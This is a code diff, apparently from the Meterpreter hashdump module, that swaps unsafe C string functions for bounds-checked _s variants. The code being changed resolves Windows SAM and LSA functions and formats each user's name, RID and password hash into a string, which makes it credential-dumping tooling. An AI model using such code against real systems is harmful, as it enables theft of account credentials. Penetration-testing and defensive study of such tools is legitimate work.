@@ -120,17 +120,21 @@ typedef size_t (*WcstombsType)(char *, const wchar_t *, size_t);
 
 
 char *StringCombine(char *string1, char *string2) {
+	size_t s1len, s2len;
 
 	if (string2 == NULL) { // nothing to append
 		return string1;
 	}
 
+	// TODO: what do we want to do if memory allocation fails?
+	s2len = strlen(string2);
 	if (string1 == NULL) { // create a new string
-		string1 = (char *)malloc(strlen(string2) + 1);
-		strncpy(string1, string2, strlen(string2) + 1);
+		string1 = (char *)malloc(s2len + 1);
+		strncpy_s(string1, s2len + 1, string2, s2len + 1);
 	} else {			   // append data to the string
-		string1 = (char *)realloc(string1, strlen(string1) + strlen(string2) + 1);
-		string1 = strncat(string1, string2, strlen(string2) + 1);
+		s1len = strlen(string1);
+		string1 = (char *)realloc(string1, s1len + s2len + 1);
+		strncat_s(string1, s1len + s2len + 1, string2, s2len + 1);
 	}
 
 	return string1;
@@ -397,7 +401,7 @@ void sizer() { __asm { ret } }
 /* initialize the context structure - returns 0 on success, return 1 on error */
 int setArgs(FUNCTIONARGS *fargs, DWORD dwMillisecondsToWait) {
 
-	HANDLE hLibrary = NULL;
+	HMODULE hLibrary = NULL;
 
 	/* set loadlibrary and getprocaddress function addresses */
 	hLibrary = LoadLibrary("kernel32");
@@ -417,36 +421,36 @@ int setArgs(FUNCTIONARGS *fargs, DWORD dwMillisecondsToWait) {
 	}
 
 	/* initialize samsrv strings */
-	strncpy(fargs->samsrvdll, "samsrv.dll", sizeof(fargs->samsrvdll));
-	strncpy(fargs->samiconnect, "SamIConnect", sizeof(fargs->samiconnect));
-	strncpy(fargs->samropendomain, "SamrOpenDomain", sizeof(fargs->samropendomain));
-	strncpy(fargs->samropenuser, "SamrOpenUser", sizeof(fargs->samropenuser));
-	strncpy(fargs->samrqueryinformationuser, "SamrQueryInformationUser", sizeof(fargs->samrqueryinformationuser));
-	strncpy(fargs->samrenumerateusersindomain, "SamrEnumerateUsersInDomain", sizeof(fargs->samrenumerateusersindomain));
-	strncpy(fargs->samifree_sampr_user_info_buffer, "SamIFree_SAMPR_USER_INFO_BUFFER", sizeof(fargs->samifree_sampr_user_info_buffer));
-	strncpy(fargs->samifree_sampr_enumeration_buffer, "SamIFree_SAMPR_ENUMERATION_BUFFER", sizeof(fargs->samifree_sampr_enumeration_buffer));
-	strncpy(fargs->samrclosehandle, "SamrCloseHandle", sizeof(fargs->samrclosehandle));
+	strncpy_s(fargs->samsrvdll, sizeof(fargs->samsrvdll), "samsrv.dll", sizeof(fargs->samsrvdll));
+	strncpy_s(fargs->samiconnect, sizeof(fargs->samiconnect), "SamIConnect", sizeof(fargs->samiconnect));
+	strncpy_s(fargs->samropendomain, sizeof(fargs->samropendomain), "SamrOpenDomain", sizeof(fargs->samropendomain));
+	strncpy_s(fargs->samropenuser, sizeof(fargs->samropenuser), "SamrOpenUser", sizeof(fargs->samropenuser));
+	strncpy_s(fargs->samrqueryinformationuser, sizeof(fargs->samrqueryinformationuser), "SamrQueryInformationUser", sizeof(fargs->samrqueryinformationuser));
+	strncpy_s(fargs->samrenumerateusersindomain, sizeof(fargs->samrenumerateusersindomain), "SamrEnumerateUsersInDomain", sizeof(fargs->samrenumerateusersindomain));
+	strncpy_s(fargs->samifree_sampr_user_info_buffer, sizeof(fargs->samifree_sampr_user_info_buffer), "SamIFree_SAMPR_USER_INFO_BUFFER", sizeof(fargs->samifree_sampr_user_info_buffer));
+	strncpy_s(fargs->samifree_sampr_enumeration_buffer, sizeof(fargs->samifree_sampr_enumeration_buffer), "SamIFree_SAMPR_ENUMERATION_BUFFER", sizeof(fargs->samifree_sampr_enumeration_buffer));
+	strncpy_s(fargs->samrclosehandle, sizeof(fargs->samrclosehandle), "SamrCloseHandle", sizeof(fargs->samrclosehandle));
 
 	/* initialize advapi32 strings */
-	strncpy(fargs->advapi32dll, "advapi32.dll", sizeof(fargs->advapi32dll));
-	strncpy(fargs->lsaopenpolicy, "LsaOpenPolicy", sizeof(fargs->lsaopenpolicy));
-	strncpy(fargs->lsaqueryinformationpolicy, "LsaQueryInformationPolicy", sizeof(fargs->lsaqueryinformationpolicy));
-	strncpy(fargs->lsaclose, "LsaClose", sizeof(fargs->lsaclose));
+	strncpy_s(fargs->advapi32dll, sizeof(fargs->advapi32dll), "advapi32.dll", sizeof(fargs->advapi32dll));
+	strncpy_s(fargs->lsaopenpolicy, sizeof(fargs->lsaopenpolicy), "LsaOpenPolicy", sizeof(fargs->lsaopenpolicy));
+	strncpy_s(fargs->lsaqueryinformationpolicy, sizeof(fargs->lsaqueryinformationpolicy), "LsaQueryInformationPolicy", sizeof(fargs->lsaqueryinformationpolicy));
+	strncpy_s(fargs->lsaclose, sizeof(fargs->lsaclose), "LsaClose", sizeof(fargs->lsaclose));
 
 	/* initialize msvcrt strings */
-	strncpy(fargs->msvcrtdll, "msvcrt.dll", sizeof(fargs->msvcrtdll));
-	strncpy(fargs->malloc, "malloc", sizeof(fargs->malloc));
-	strncpy(fargs->realloc, "realloc", sizeof(fargs->realloc));
-	strncpy(fargs->free, "free", sizeof(fargs->free));
-	strncpy(fargs->memcpy, "memcpy", sizeof(fargs->memcpy));
+	strncpy_s(fargs->msvcrtdll, sizeof(fargs->msvcrtdll), "msvcrt.dll", sizeof(fargs->msvcrtdll));
+	strncpy_s(fargs->malloc, sizeof(fargs->malloc), "malloc", sizeof(fargs->malloc));
+	strncpy_s(fargs->realloc, sizeof(fargs->realloc), "realloc", sizeof(fargs->realloc));
+	strncpy_s(fargs->free, sizeof(fargs->free), "free", sizeof(fargs->free));
+	strncpy_s(fargs->memcpy, sizeof(fargs->memcpy), "memcpy", sizeof(fargs->memcpy));
 
 	/* initialize ntdll strings */
-	strncpy(fargs->ntdlldll, "ntdll.dll", sizeof(fargs->ntdlldll));
-	strncpy(fargs->wcstombs, "wcstombs", sizeof(fargs->wcstombs));
+	strncpy_s(fargs->ntdlldll, sizeof(fargs->ntdlldll), "ntdll.dll", sizeof(fargs->ntdlldll));
+	strncpy_s(fargs->wcstombs, sizeof(fargs->wcstombs), "wcstombs", sizeof(fargs->wcstombs));
 
 	/* initialize kernel sync objects */
-	strncpy(fargs->ReadSyncEvent, "SAM", sizeof(fargs->ReadSyncEvent));
-	strncpy(fargs->FreeSyncEvent, "FREE", sizeof(fargs->FreeSyncEvent));
+	strncpy_s(fargs->ReadSyncEvent, sizeof(fargs->ReadSyncEvent), "SAM", sizeof(fargs->ReadSyncEvent));
+	strncpy_s(fargs->FreeSyncEvent, sizeof(fargs->FreeSyncEvent), "FREE", sizeof(fargs->FreeSyncEvent));
 
 	/* initialize wait time */
 	fargs->dwMillisecondsToWait = dwMillisecondsToWait;
@@ -591,7 +595,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 			/* METERPRETER CODE */
 			hashstring = StringCombine(hashstring, UsernameHashResults[dwCurrentUserIndex].Username);
 			hashstring = StringCombine(hashstring, ":");
-			_snprintf(buffer, 30, "%d", UsernameHashResults[dwCurrentUserIndex].RID);
+			_snprintf_s(buffer, sizeof(buffer), 30, "%d", UsernameHashResults[dwCurrentUserIndex].RID);
 			hashstring = StringCombine(hashstring, buffer);
 			hashstring = StringCombine(hashstring, ":");
 			/* END METERPRETER CODE */
@@ -603,7 +607,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
                     && (regData[6] == 0x35b4d3aa) && (regData[7] == 0xee0414b5) )
                     sprintf( LMdata, "NO PASSWORD*********************" );
 				*/
-				_snprintf(buffer, 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
+				_snprintf_s(buffer, sizeof(buffer), 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
 				hashstring = StringCombine(hashstring, buffer);
 				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
 			}
@@ -615,7 +619,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
                     && (regData[2] == 0xd7593cb7) && (regData[3] == 0xc089c0e0) )
                     sprintf( NTdata, "NO PASSWORD*********************" );
 				*/
-				_snprintf(buffer, 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
+				_snprintf_s(buffer, sizeof(buffer), 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
 				hashstring = StringCombine(hashstring, buffer);
 				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
 			}
